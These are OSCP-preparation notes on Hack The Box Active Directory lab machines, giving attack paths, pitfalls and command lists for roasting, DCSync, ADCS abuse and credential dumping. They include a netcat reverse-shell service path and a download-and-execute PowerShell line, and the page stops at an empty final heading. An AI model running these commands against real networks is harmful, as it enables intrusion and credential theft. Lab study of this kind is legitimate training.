+++
title = 'HTB Active Directory Machines — OSCP Edge Cases'
date = 2026-10-30
type = 'notes'
weight = 70
toc = true
tags = ['oscp', 'methodology', 'htb', 'active-directory', 'writeups']
+++

> The AD half of the OSCP-like HTB list — one path per box, the step that actually decides it, and the exact command worth memorising. These are **edge-case notes, not walkthroughs**: every IP, domain, user and path must be adapted to your target, and the linked writeup remains the walkthrough of record.
>
> **Verification status (2026-10-28):** every CVE and technique below was checked against NVD/MITRE, the vendor advisory, and at least one independent write-up. **Three factual corrections** were made to earlier drafts — the **Solidstate CVE** (CVE-2015-7611), the **Nineveh chkrootkit CVE** (CVE-2014-0476), and the **OpenSTAManager chain attribution** (CVE-2026-29782, not CVE-2025-69212). See [Corrections](#corrections). Where a source conflict remains, the note is marked **(unverified)**.

Companion pages: [Command Checklist](/notes/oscp-labs/commands/) · [Pattern Library](/notes/oscp-labs/patterns/) · [Methodology](/notes/oscp-labs/methodology/) · [Machine Index](/notes/oscp-labs/machine-index/).

## How to use this page

* **Assumed breach vs unauthenticated.** Only **five** boxes hand you credentials at the start — Administrator (`olivia:ichliebedich`), Certified (`judith.mader:judith09`), EscapeTwo (`rose:KxEPkKe6R8su`), Puppy (`levi.james:KingofAkron2025!`) and Signed (`scott:Sm230#C5NatH`). For those, the first ten minutes are `--shares`, BloodHound, `certipy find` and per-service auth checks — **not** brute force. Everything else starts with null SMB/RPC, a web bug, or a share.
* **BloodHound before exploitation.** Collect with `bloodhound-python -c all --zip` (or `bloodhound-ce-python`) and read the *Abuse Info* of each edge; rights on the **domain node** show up as GetChanges/GetChangesAll, not as an edge called "DCSync" (Sauna).
* **Every found secret is a reuse test.** Fan out `nxc smb/ldap/winrm/mssql/ftp` with `--continue-on-success`; a service that fails is not the service that matters (Return: WinRM but no SMB admin; Administrator: FTP but no WinRM for `benjamin`). Try the *corrected* account name when a config spells it differently (Sauna).
* **ADCS, delegation and time.** None of Active/Forest/Sauna/Flight/Return/Blackfield/Cicada/TheFrizz/Administrator/Monteverde exposes a CA — do not burn exam minutes on Certipy there. The ESC paths live in Escape (ESC1), EscapeTwo (ESC4→ESC1) and Certified (ESC9). Clock skew is the single most common time sink: `sudo ntpdate <dc fqdn>`, expect the VPN to drop, reconnect — but note that AS-REP roasting tolerates hours of skew (Sauna).

## At-a-glance

| Box | Start | Entry technique | Key escalation | Difficulty |
| --- | --- | --- | --- | --- |
| Active | Unauthenticated | GPP cpassword in DFS-R share | Kerberoast Administrator | Easy |
| Forest | Unauthenticated | Null RPC → AS-REP | WriteDacl → DCSync | Easy |
| Sauna | Unauthenticated | Kerbrute → AS-REP | AutoLogon → GetChanges/GetChangesAll | Easy |
| Flight | Unauthenticated | PHP LFI → UNC → NetNTLMv2 | Machine TGT (tgtdeleg) → DCSync | Hard |
| Return | Unauthenticated | Printer panel → LDAP cleartext | Server Operators `sc config` | Easy |
| Blackfield | Unauthenticated | Profiles share → AS-REP | ForceChangePassword → LSASS → SeBackup | Hard |
| Cicada | Unauthenticated | Guest SMB → HR share → RID brute | LDAP description → Backup Operators | Easy |
| TheFrizz | Unauthenticated | Gibbon LMS CVE-2023-45878 | Kerberos SSH → GPO abuse | Medium |
| Administrator | Assumed breach | BloodHound ACL chain | GenericAll → FTP psafe3 → targeted Kerberoast | Medium |
| Monteverde | Unauthenticated | RPC querydispinfo → spray | ADSync LocalDB + mcrypt | Medium |
| Escape | Unauthenticated | SMB PDF → MSSQL | Coerce → ESC1 | Medium |
| EscapeTwo | Assumed breach | xlsx → MSSQL `sa` | WriteOwner → shadow creds → ESC4→ESC1 | Medium |
| Certified | Assumed breach | WriteOwner Management group | Shadow creds ×2 → ESC9 | Medium |
| Puppy | Assumed breach | HR group → GenericWrite Developers | KeePassXC → GenericAll → DPAPI | Medium |
| Timelapse | Unauthenticated | winrm_backup.zip → pfx | Certificate WinRM → LAPS | Easy |
| Signed | Assumed breach | SQL login `scott` | Silver ticket → OPENROWSET | Medium |

## Active

**Path:** Anonymous SMB on the DFS-R `Replication` share → `Groups.xml` cpassword → `gpp-decrypt` → `svc_tgs` → Kerberoast (SPN owned by **Administrator**) → `psexec`.

**Edge cases:**

* SYSVOL is *not* anonymously readable, but the DFS-R **`Replication`** share is — that is the whole foothold. The file is `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml`; recurse, don't guess the GUID.
* GPP (MS14-025) is **offline decryption, not cracking**: the AES key is published by Microsoft, so `gpp-decrypt` is instant and hashcat is the wrong reflex.
* The roastable SPN was `active/CIFS:445` on **Administrator** itself — one crack equals DA. `-request` alone prints the hash; `-save -outputfile` also writes it.
* You never need a shell: with DA credentials `smbclient //IP/C$` reads `users\administrator\desktop\root.txt`; psexec/`smbexec` is optional noise.

**Commands to remember:**

```bash
smbmap -H IP
smbclient -N //IP/Replication
gpp-decrypt <cpassword>
GetUserSPNs.py -request -dc-ip IP active.htb/SVC_TGS -save -outputfile out
hashcat -m 13100 out rockyou.txt
psexec.py active.htb/administrator@IP
```

**Notes:** [Initial access](/notes/active-directory/initial-access/) · [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/) · Writeup: [source](https://0xdf.gitlab.io/2018/12/08/htb-active.html) · [alt](https://asbawy.github.io/writeups/htb-active)

## Forest

**Path:** Null RPC → `enumdomusers` → AS-REP roast `svc-alfresco` → WinRM → BloodHound: Account Operators → GenericAll on Exchange Windows Permissions → WriteDacl on the domain → grant DCSync → `secretsdump`.

**Edge cases:**

* `rpcclient -U "" -N` plus `enumdomusers` / `enumdomgroups` / `querygroupmem` yields users and RIDs with **no credentials at all** — cheaper and quieter than kerbrute.
* AS-REP: loop `GetNPUsers` per user and grep `krb5asrep`; the tool prints a "doesn't have UF_DONT_REQUIRE_PREAUTH" line for every failure, which is noise, not a finding.
* The BloodHound path is nested groups ending in **WriteDacl on the domain object** — you must join `Exchange Windows Permissions` *and* write the ACE (`-Rights DCSync`), then `secretsdump` works from Kali.
* **60-second revert:** a scheduled task `restore` runs `revert.ps1` in a `while($true)` loop, resetting `svc-alfresco` to `s3rvice` and stripping DCSync ACEs and group memberships. If your ACE "disappears", that is why: re-add and dump in one chain (`schtasks /query /tn restore /v`).

**Commands to remember:**

```bash
rpcclient -U "" -N IP          # then: enumdomusers
GetNPUsers.py -no-pass -dc-ip IP htb.local/user
hashcat -m 18200
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity svc-alfresco -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
secretsdump.py svc-alfresco:s3rvice@IP
evil-winrm -u administrator -H <NTLM>
```

**Notes:** [Initial access](/notes/active-directory/initial-access/) · [Internal enumeration](/notes/active-directory/internal-enumeration-and-lateral-movement/) · Writeup: [source](https://0xdf.gitlab.io/2020/03/21/htb-forest.html)

## Sauna

**Path:** `kerbrute userenum` → AS-REP roast `fsmith` → WinRM → AutoLogon registry credentials `svc_loanmgr` → GetChanges + GetChangesAll → `secretsdump` → DA.

**Edge cases:**

* kerbrute returns the *same* name in four casings (`fsmith`, `Fsmith`, `FSmith`, `FSMITH`) as separate "valid" hits — lowercase and `sort -u` before roasting or spraying, or your list (and any lockout counter) is inflated 4×.
* nmap reports `clock-skew: 8h00m40s`, yet kerbrute/`GetNPUsers` still worked — a roast needs no ticket, so don't detour into time sync before trying it.
* winPEAS shows `DefaultUserName = EGOTISTICALBANK\svc_loanmanager` from AutoLogon while the real account is `svc_loanmgr`; `net user` on the box settles it — try the password against the corrected name.
* DCSync rights appear in BloodHound as **GetChanges + GetChangesAll** on the domain node, not as an edge labelled "DCSync"; read the node's Abuse Info.

**Commands to remember:**

```bash
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc IP users.txt
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile h
hashcat -m 18200 h rockyou.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
secretsdump.py 'svc_loanmgr:pass@IP'
```

**Notes:** [Initial access](/notes/active-directory/initial-access/) · [Attack vectors](/notes/windows-privilege-escalation/enumerating-attack-vectors/) · Writeup: [source](https://0xdf.gitlab.io/2020/07/18/htb-sauna.html)

## Flight

**Path:** PHP `?view=` file read → SMB UNC include captures NetNTLMv2 → crack `svc_apache` → spray the same password → `S.Moon` writes to `Shared` → `ntlm_theft` lures → `C.Bum` → ASPX webshell in the `Web` share → IIS apppool → machine TGT (`tgtdeleg`) → DCSync.

**Edge cases:**

* `view=` filters `..` and `\` but accepts absolute `/` paths. The HTTP include proves it is `file_get_contents` (source is rendered, not executed), so pivot to a `\\attacker\share` UNC and let the app authenticate to you.
* Writing lures to an empty share works, but **most lure types are blocked on upload** (`.scf`, `.lnk`, `.url`, `.rtf`, `.docx`, `.m3u`…): only `.xml`, `.jnlp`, `.application` and `desktop.ini` landed, and the XML stylesheet still triggered auth. Upload with `prompt false; mput *` and read the `NT_STATUS_ACCESS_DENIED` list as normal.
* `iis apppool\defaultapppool` is a virtual account: over the network it *is* the machine account `G0$`. Its NetNTLMv2 is uncrackable, but `Rubeus tgtdeleg /nowrap` gets a machine TGT (fake delegation) → `kirbi2ccache` → `KRB5CCNAME` → `secretsdump -k -no-pass`.
* `secretsdump` first errors with "Policy SPN target name validation… try -just-dc-user" — that hint is a red herring; the real error underneath is `KRB_AP_ERR_SKEW`, fixed by `sudo ntpdate -s flight.htb` (drops the VPN; reconnect).
* `C.Bum` is not in Remote Management Users → no WinRM; use `RunasCs -r IP:port cmd` for a shell as that user.

**Commands to remember:**

```bash
smbclient //IP/Users -U svc_apache
lookupsid.py flight.htb/svc_apache:pass@flight.htb
crackmapexec smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
ntlm_theft.py -g all -s IP -f x
hashcat -m 5600
Rubeus.exe tgtdeleg /nowrap
kirbi2ccache t kirbi.ccache; export KRB5CCNAME=...
secretsdump.py -k -no-pass g0.flight.htb
RunasCs.exe user pass -r IP:443 cmd
```

**Notes:** [SMB](/notes/protocols-and-services/smb/) · [RFI](/notes/web-applications/web-attacks/remote-file-inclusion-rfi/) · [Kerberos delegation](/notes/active-directory/kerberos-delegation/) · Writeup: [source](https://0xdf.gitlab.io/2023/05/06/htb-flight.html)

## Return

**Path:** Printer admin panel `/settings.php` (the only field actually posted is `ip`) → outbound LDAP simple bind to your listener → cleartext `svc-printer` credentials → WinRM → **Server Operators** → `sc.exe config` binary path → SYSTEM.

**Edge cases:**

* The other form fields are cosmetic — the POST body is just `ip=`. Point it at `tun0`, run `nc -lvnp 389`, and the box sends an LDAP bindRequest with user and password in clear (`Responder` also catches it; Wireshark decodes it if the raw bytes look mangled).
* `svc-printer` is *not* admin: `sc.exe query` and `Get-Service` fail with access denied. That is not a dead end — Server Operators can still `sc config` a service it does not own administratively; enumerate candidate services blind (0xdf used `VSS`, a second writeup used `VMTools`).
* `sc start` returns **1053** ("did not respond in time") and the service manager kills the child after ~30 s, taking your shell with it. Set `binpath= "cmd.exe /c C:\path\nc64.exe -e cmd IP 443"` so the shell survives the timeout; 53/443 is a safe port.
* `whoami /priv` also shows SeBackup/SeRestore/SeLoadDriver, and Server Operators gives `C$` read+write — the flag is reachable without any service abuse.

**Commands to remember:**

```bash
curl -d 'ip=10.10.14.x' http://IP/settings.php
nc -lvnp 389
nxc smb IP -u svc-printer -p 'pass' --shares
nxc ldap IP -u svc-printer -p 'pass' --users --groups
sc.exe config VSS binpath= "C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd IP 443"
sc.exe start VSS
```

**Notes:** [Built-in groups](/notes/windows-privilege-escalation/built-in-groups-abuse/) · [SSRF](/notes/web-applications/web-attacks/ssrf/) · Writeup: [source](https://0xdf.gitlab.io/2022/05/05/htb-return.html) · [alt](https://bytejmp.com/posts/return-htb)

## Blackfield

**Path:** Anonymous SMB `profiles` share → user list → AS-REP roast `support` → `bloodhound-python` → **ForceChangePassword** on `audit2020` → `forensic` share LSASS dump → pypykatz → `svc_backup` hash → WinRM → SeBackupPrivilege + DiskShadow → `ntds.dit` + SYSTEM → `secretsdump`.

**Edge cases:**

* The `profiles` share is empty but its **folder names are the user list** (one odd `audit2020` folder stands out) — no RPC needed for usernames. An authenticated `ldapsearch` dump is ~20k lines, so grep it instead of reading it.
* ForceChangePassword over RPC works through `rpcclient` with **info level 23**: `setuserinfo2 audit2020 23 "NewPass!"` — 0xdf's earlier attempts with a weak/short password were rejected; the 23 form is the one that worked.
* `bloodhound-python` is fussy: pass `-ns <DC IP>` **and** `-dc dc01.blackfield.local` (FQDN) or collection fails; use `-c ALL`.
* DiskShadow traps: the script file must be CRLF (`unix2dos`) or `nowriters` is parsed as `nowriter` and it dies on line 1; add `set metadata c:\programdata\x.cab` (or run from a writable dir) or it fails creating the .cab; then copy out of `z:` with `Copy-FileSeBackupPrivilege` straight to an SMB share you host, and `reg save hklm\system`.
* Beyond root: `root.txt` is **EFS-encrypted**, so SeBackupPrivilege returns `E_ACCESSDENIED` and `cipher /c` fails from a WinRM (session 0) shell — don't debug your backup technique, use the DA hash you just dumped.

**Commands to remember:**

```bash
smbclient -N //IP/profiles
for u in $(cat users); do GetNPUsers.py -no-pass -dc-ip IP blackfield.local/$u | grep krb5asrep; done
rpcclient -U 'dom/user%pass' IP -c 'setuserinfo2 audit2020 23 "0xdf!!!"'
bloodhound-python -c ALL -u support -p pass -d blackfield.local -dc dc01.blackfield.local -ns IP
pypykatz lsa minidump lsass.DMP
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\IP\share\ntds.dit
secretsdump.py -system system -ntds ntds.dit LOCAL
```

**Notes:** [Excessive user rights](/notes/windows-privilege-escalation/excessive-user-rights-abuse/) · [Internal enumeration](/notes/active-directory/internal-enumeration-and-lateral-movement/) · Writeup: [source](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html) · [alt](https://hackindex.io/writeups/blackfield)

## Cicada

**Path:** `guest` with an empty password → `HR` share "Notice from HR.txt" default password → `--rid-brute` users → spray → LDAP **description** field holds a password → `DEV` share `Backup_script.ps1` credentials → WinRM (Backup Operators) → `reg save` SAM+SYSTEM → local admin hash = DA.

**Edge cases:**

* Guest is still enabled: `netexec smb IP -u guest -p '' --shares` (and `smbclient -N`) works where anonymous listing sometimes doesn't. The HR note is a literal default password handed to "new hires".
* After the spray, `netexec ldap IP -u user -p pass --users` prints the LDAP **description** column — one account's description was its password. BloodHound collects descriptions too; read them before attacking.
* On a **DC**, SAM RID 500 `Administrator` *is* the domain Administrator, so `reg save hklm\sam` + `hklm\system` + `secretsdump -sam -system LOCAL` is enough to own the box — no `ntds.dit`, no DiskShadow. Use `nxc --ntds`/diskshadow only when you need every domain hash.
* `impacket reg.py ... backup` is the "clean" remote way to make the hive copies, but it is extremely slow over the HTB VPN and times out; in-session `reg save` + `download` is faster.

**Commands to remember:**

```bash
netexec smb IP -u guest -p '' --shares
netexec smb IP -u guest -p '' --rid-brute | grep SidTypeUser
netexec ldap IP -u u -p p --users
netexec smb IP -u u -p p --shares
reg save hklm\sam sam
reg save hklm\system system
secretsdump.py -sam sam -system system LOCAL
evil-winrm -u administrator -H <NTLM>
```

**Notes:** [Built-in groups](/notes/windows-privilege-escalation/built-in-groups-abuse/) · [SMB](/notes/protocols-and-services/smb/) · Writeup: [source](https://0xdf.gitlab.io/2025/02/15/htb-cicada.html)

## TheFrizz

**Path:** Gibbon LMS file-write (**CVE-2023-45878**) → webshell → DB hash+salt → crack (mode 1420) → **NTLM disabled**, so Kerberos: `kinit` + `ssh -k` → `$RECYCLE.BIN` WAPT backup → `m.schoolbus` (Group Policy Creator Owners) → new GPO + link + SharpGPOAbuse computer task → SYSTEM.

**Edge cases:**

* NTLM is disabled on the DC: netexec returns `STATUS_NOT_SUPPORTED` until you add `-k`. Any Kerberos auth needs a synced clock (`ntpdate`; nmap showed 7 h skew). TheFrizz's writeup notes ~7-hour skew requiring `faketime` to bypass Kerberos before SSH lands.
* SSH does Kerberos SSO: correct `/etc/krb5.conf`, `kinit user`, then `ssh -k` **to the DC's real FQDN** (`frizzdc.frizz.htb`). The short name fails with `Server not found in Kerberos database` — almost certainly no SPN exists for it; target the FQDN and mind `/etc/hosts` ordering, which decides which name SSH actually sends **(SPN explanation unverified; the error and the FQDN workaround are documented)**.
* Recycle Bin: `$I*` files are metadata, `$R*` files hold the original content. `ls` hides them (`-Force`), and `cd '$RECYCLE.BIN'` must be single-quoted or PowerShell expands it to nothing. Pull the 7z, not the `$I` stub.
* GPO abuse with only "Group Policy Creator Owners": you cannot edit the default policies, so `New-GPO` + `New-GPLink -Target "DC=frizz,DC=htb"`, then `SharpGPOAbuse --addcomputertask`; nothing applies until `gpupdate /force` (or ~90 min). Use a **fresh GPO per command** (the immediate task does not update cleanly), and note the box also has a cleanup script on a couple-minute timer.

**Commands to remember:**

```bash
hashcat -m 1420 hash:salt rockyou.txt
kinit f.frizzle
ssh -k f.frizzle@frizzdc.frizz.htb
Get-ChildItem 'C:\$RECYCLE.BIN' -Recurse -Force
New-GPO -Name x; New-GPLink -Name x -Target "DC=frizz,DC=htb"
SharpGPOAbuse.exe --addcomputertask --GPOName x --TaskName t --Command powershell.exe --Arguments "..."
gpupdate /force
```

**Notes:** [Known-exploit escalation](/notes/active-directory/privilege-escalation-to-domain-admin-using-known-exploits/) · [Excessive user rights](/notes/windows-privilege-escalation/excessive-user-rights-abuse/) · Writeup: [source](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html) · [alt](https://qiita.com/H0td0gd0g/items/3039de8d2758a5ccb91b)

## Administrator

**Path:** Start with `olivia:ichliebedich` (assumed breach) → BloodHound: **GenericAll** on `michael` → password change → **ForceChangePassword** on `benjamin` → FTP (`Share Moderates`) `Backup.psafe3` → hashcat 5200 → `emily` → **GenericWrite** on `ethan` → targeted Kerberoast → `ethan` has DCSync → `secretsdump`.

**Edge cases:**

* Starting credentials are given; the intended first move is BloodHound (`bloodhound-python -c all --zip`, CE branch). Per-user access differs by *service*, not just SMB — `benjamin` has no WinRM but does have FTP because of `Share Moderates`. Always run `nxc ftp` alongside smb/winrm/ldap.
* `Backup.psafe3` is a Password Safe V3 database whose **first line alone** is the crackable blob (`file` identifies it); pass it directly to hashcat and force `-m 5200` (autodetect offers 37 modes). Open the DB in the Password Safe GUI afterwards to see which password belongs to which account — two of the three are stale.
* GenericWrite → **targeted** Kerberoast: `targetedKerberoast.py` adds a temporary SPN to `ethan`, requests the TGS, then removes it. Needs a synced clock (`ntpdate administrator.htb`) or it fails mid-run; crack as 13100.
* GenericAll password reset from Linux without BloodHound's PowerShell: `net rpc password "michael" "NewPass" -U DOMAIN/olivia%pass -S IP` — no shell needed, and `michael` is in Remote Management Users so WinRM follows immediately.

**Commands to remember:**

```bash
netexec smb IP --generate-hosts-file /etc/hosts
bloodhound-python -d administrator.htb -c all -u olivia -p pass -ns IP --zip
net rpc password "michael" "0xdf0xdf." -U "administrator.htb"/"olivia"%pass -S IP
hashcat -m 5200 Backup.psafe3 rockyou.txt
sudo ntpdate administrator.htb
targetedKerberoast.py -v -d administrator.htb -u emily -p pass
secretsdump.py ethan:limpbizkit@dc.administrator.htb
```

**Notes:** [Initial access](/notes/active-directory/initial-access/) · [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/) · Writeup: [source](https://0xdf.gitlab.io/2025/04/19/htb-administrator.html)

## Monteverde

**Path:** Null RPC `querydispinfo` user list → username-as-password spray → `SABatchJobs` → `users$` share → `mhope/azure.xml` plaintext → WinRM (`Azure Admins`) → ADSync LocalDB + `mcrypt.dll` → domain Administrator password → WinRM.

**Edge cases:**

* `rpcclient -U "" -N` + `querydispinfo` leaks accounts **and descriptions** (here the `AAD_987d7f…` sync account's description reveals Azure AD Connect). Description fields are free intel.
* The username-as-password check is a cross-product (`-u users -p users --continue-on-success`). On a real engagement use one password per user per window or you lock accounts out — this is an HTB shortcut, not exam technique.
* `users$` maps `C:\Users`; `azure.xml` is PowerShell **CLIXML** for `PSADPasswordCredential` with a plaintext `<S N="Password">` element — grep for `Password`, don't parse it as an XML config file.
* ADSync decrypt: connect to the `ADSync` LocalDB (`Server=127.0.0.1;Database=ADSync;Integrated Security=True`), read `keyset_id, instance_id, entropy` from `mms_server_configuration`, read `encrypted_configuration` from `mms_management_agent WHERE ma_type='AD'`, and decrypt via `Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager` from `mcrypt.dll`. The replication account here was **domain Administrator itself**, not `MSOL_*`.
* Version caveat from the author's update: newer AAD Connect builds store keys differently and need the ADSync service-account context/Credential Manager (e.g. `sqlcmd`/`xp_cmdshell` as that account) **(unverified for this build)**.

**Commands to remember:**

```bash
rpcclient -U "" -N IP          # then: querydispinfo
crackmapexec smb IP -u users -p users --continue-on-success
smbmap -H IP -u SABatchJobs -p SABatchJobs -R 'users$'
sqlcmd -d ADSync -Q "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
iex (new-object net.webclient).downloadstring('http://IP/Get-MSOLCredentials.ps1')
evil-winrm -u administrator -p '...'
```

**Notes:** [Initial access](/notes/active-directory/initial-access/) · [MSSQL](/notes/protocols-and-services/mssql/) · Writeup: [source](https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html)

## Escape

**Path:** Null-auth SMB → credentials in a PDF on `Public` → MSSQL → coerce Net-NTLMv2 → crack → `sql_svc` → credentials in the SQL ERRORLOG → `Ryan.Cooper` → ESC1 → DA. *(Not assumed breach — starts unauthenticated.)*

**Edge cases:**

* SMB listing works with *any* username plus an empty password (`-u bogus -p ''`), not with no user at all — "anonymous" failures often just mean you didn't send a user.
* The PDF explicitly says to switch to **SQL Server Authentication**, not Windows auth — following that hint is the whole initial access.
* `xp_cmdshell` and even `sp_configure` are denied for `PublicUser`: coercion, not RCE, is the intended move.
* The next password is leaked in `C:\SQLServer\Logs\ERRORLOG.BAK` because a user typed their password into the username field (`Logon failed for user 'NuclearMosquito3'`) — read SQL logs as credential material.
* Template `UserAuthentication` = `ENROLLEE_SUPPLIES_SUBJECT` + Domain Users can enroll = textbook **ESC1**. Beyond root: silver ticket → file read via MSSQL (the idea returns in Signed).

**Commands to remember:**

```bash
smbclient //IP/Public -N
mssqlclient.py seq.htb/PublicUser:GuestUserCantWrite1@dc.seq.htb
EXEC xp_dirtree '\\LHOST\share', 1, 1
hashcat -m 5600
certipy find -vulnerable -u ryan.cooper -p ... -dc-ip IP -stdout
certipy req -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb
certipy auth -pfx administrator.pfx -domain sequel.htb
```

**Notes:** [ADCS attacks](/notes/active-directory/adcs-attacks/) · [MSSQL](/notes/protocols-and-services/mssql/) · Writeup: [source](https://0xdf.gitlab.io/2023/06/17/htb-escape.html)

## EscapeTwo

**Path:** Assumed breach `rose:KxEPkKe6R8su` (MSSQL/SMB only) → corrupt xlsx on `Accounting Department` → spray (SQL + domain) → `sa` → `xp_cmdshell` → `sql_svc` → reuse → `ryan` → WriteOwner `CA_SVC` → shadow credential → ESC4→ESC1 → DA.

**Edge cases:**

* The start has **no WinRM** — MSSQL is the pivot; don't stall on WinRM.
* Both `.xlsx` files have magic bytes `50 48 04 03` ("PH..") instead of `50 4B 03 04` ("PK..") → fix the first four bytes in a hex editor (or `unzip` the sheet XML) then open in LibreOffice. `file` saying "Zip archive" rather than "Microsoft Excel 2007+" is the tell.
* Spray **twice**: domain auth gives `oscar`; only `--local-auth` finds the SQL login `sa:MSSQLP@ssw0rd!`. Same wordlist, different auth backend.
* `certipy shadow auto` fails `INSUFF_ACCESS_RIGHTS` because WriteOwner alone is not enough — become owner, *then* grant yourself rights, then shadow-credential.
* **ESC4 only appears when `certipy find` is run as `ca_svc`** (member of Cert Publishers). Re-run ADCS enumeration after every new user or you will wrongly conclude "no vulnerable templates". After exploiting ESC4, restore the template; Certipy 5.x renamed the flags versus the 4.8.2 commands in older writeups.

**Commands to remember:**

```bash
netexec mssql IP -u users -p passwords --continue-on-success --local-auth
mssqlclient.py 'seq/sa:MSSQLP@ssw0rd!@dc01.seq.htb'
enable_xp_cmdshell
certipy shadow auto -u ryan@seq.htb -p ... -account ca_svc
bloodyAD -d seq.htb -u ryan -p ... set owner ca_svc ryan
certipy template -u ca_svc -hashes H -template DunderMifflinAuthentication -save-old
certipy req ... -upn administrator@sequel.htb
```

**Notes:** [ADCS attacks](/notes/active-directory/adcs-attacks/) · [MSSQL](/notes/protocols-and-services/mssql/) · Writeup: [source](https://0xdf.gitlab.io/2025/05/24/htb-escapetwo.html)

## Certified

**Path:** Assumed breach `judith.mader:judith09` → WriteOwner over the `Management` group → add self → shadow credential `management_svc` → GenericAll over `ca_operator` → shadow credential → ESC9 (UPN swap) → DA.

**Edge cases:**

* A three-hop ACL chain where **two hops are Shadow Credentials** — the same primitive reused, not a new technique each time.
* WriteOwner needs the three-step dance: `owneredit` → `dacledit -rights WriteMembers` → `net rpc group addmem`.
* ESC9's UPN must be **`Administrator` without `@domain`** (it would otherwise collide with the real admin UPN); the issued certificate then has no SID extension.
* **Revert the UPN afterwards** — 0xdf notes leaving it breaks the final `certipy auth`; that is correctness, not just OPSEC. `certipy auth` also needs `-domain` because the certificate carries no domain.
* `owneredit.py` dying with `unsupported hash type MD4` is an OpenSSL 3 / Impacket environment issue, not a permissions problem. Caveat (HackTricks): classic ESC9 depends on `StrongCertificateBindingEnforcement=1`; Microsoft's Sept 2025 update removed the KDC override, so the recipe can fail on a fully patched DC.

**Commands to remember:**

```bash
owneredit.py -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip IP
dacledit.py -action write -rights WriteMembers -principal judith.mader -target Management ...
net rpc group addmem Management judith.mader
certipy shadow auto -account management_svc
certipy account update -user ca_operator -upn Administrator
certipy req -template CertifiedAuthentication
certipy auth -pfx administrator.pfx -domain certified.htb
```

**Notes:** [ADCS attacks](/notes/active-directory/adcs-attacks/) · [Internal enumeration](/notes/active-directory/internal-enumeration-and-lateral-movement/) · Writeup: [source](https://0xdf.gitlab.io/2025/03/15/htb-certified.html) · [ESC9 caveat](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)

## Puppy

**Path:** Assumed breach `levi.james:KingofAkron2025!` → HR group → GenericWrite on `Developers` → self-add → DEV share → KeePassXC DB → crack → spray → `ant.edwards` → GenericAll `adam.silver` → password reset + enable → WinRM → site backup XML → `steph.cooper` → DPAPI → admin.

**Edge cases:**

* Group membership *is* the permission: adding yourself to `Developers` is what unlocks the share (re-check `--shares` after every ACL change).
* **"File version '40000' is currently not supported"** from the distro `keepass2john` — KeePassXC 2.7.x KDBX4 needs the newer John (`snap install john-the-ripper`); hashcat cannot parse this format. Dump with `keepassxc-cli export --format csv`.
* The reset of `adam.silver` returns `STATUS_ACCOUNT_DISABLED` — the account was already disabled; clear the UAC flag, don't re-reset the password.
* The config backup (`nms-auth-config.xml.bak`) leaks a plaintext LDAP **bind-password** — grep app backups for `<bind-password>`.
* DPAPI: `evil-winrm download` crashes on the `Credentials`/`Protect` blobs → base64 the bytes and rebuild locally; decrypt the masterkey with the *user's own password* + SID, then the credential blob. Clock skew had to be fixed (`ntpdate`) before Kerberos-based collection *(necessity unverified)*.

**Commands to remember:**

```bash
net rpc group addmem developers levi.james -U puppy.htb/levi.james%'...' -S puppy.htb
bloodhound-ce-python -c all -ns IP --zip
john-the-ripper.keepass2john recovery.kdbx
keepassxc-cli export --format csv recovery.kdbx
net rpc password adam.silver 'NewPass1!' -U ...
bloodyAD ... remove uac adam.silver -f ACCOUNTDISABLE
dpapi.py masterkey -file <guid> -sid S-1-5-21-... -password '...'
dpapi.py credential -file <blob> -key 0x...
```

**Notes:** [Internal enumeration](/notes/active-directory/internal-enumeration-and-lateral-movement/) · [Attack vectors](/notes/windows-privilege-escalation/enumerating-attack-vectors/) · Writeup: [source](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

## Timelapse

**Path:** Null SMB → `Shares` → `winrm_backup.zip` → zip2john → `.pfx` → pfx2john → certificate-auth WinRM as `legacyy` → PowerShell history credentials → `svc_deploy` → LAPS read → local admin. *(Not assumed breach — starts unauthenticated.)*

**Edge cases:**

* `crackmapexec --shares` fails with `STATUS_USER_SESSION_DELETED` while `smbclient -L -N` succeeds — when one SMB tool fails, try the other before concluding "no shares".
* **Certificate-based WinRM before you ever touch ADCS**: `-S` (5986) plus `-c cert.crt -k key.pem`, after `openssl pkcs12 -in x.pfx -nocerts/-clcerts`.
* Two-stage cracking: archive password (`zip2john`) then key password (`pfx2john`) — same wordlist, two hashes.
* `ConsoleHost_history.txt` contains a password in cleartext inside a `ConvertTo-SecureString` line — always `type` this file.
* LAPS: any user with read on `ms-mcs-admpwd` gets the local admin password; no exploit needed. `root.txt` is *not* on Administrator's desktop (it is on `TRX`'s) because LAPS rotation forced HTB to use a second static admin for flag rotation — don't assume a failed box when the flag is "missing".

**Commands to remember:**

```bash
smbclient -L //dc01.timelapse.htb -N
zip2john winrm_backup.zip
pfx2john.py legacyy_dev_auth.pfx
openssl pkcs12 -in x.pfx -nocerts -out key.enc
openssl rsa -in key.enc -out key
openssl pkcs12 -in x.pfx -clcerts -nokeys -out cert.crt
evil-winrm -i host -S -k key -c cert.crt
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

**Notes:** [Initial access](/notes/active-directory/initial-access/) · [Excessive user rights](/notes/windows-privilege-escalation/excessive-user-rights-abuse/) · Writeup: [source](https://0xdf.gitlab.io/2022/08/20/htb-timelapse.html)

## Signed

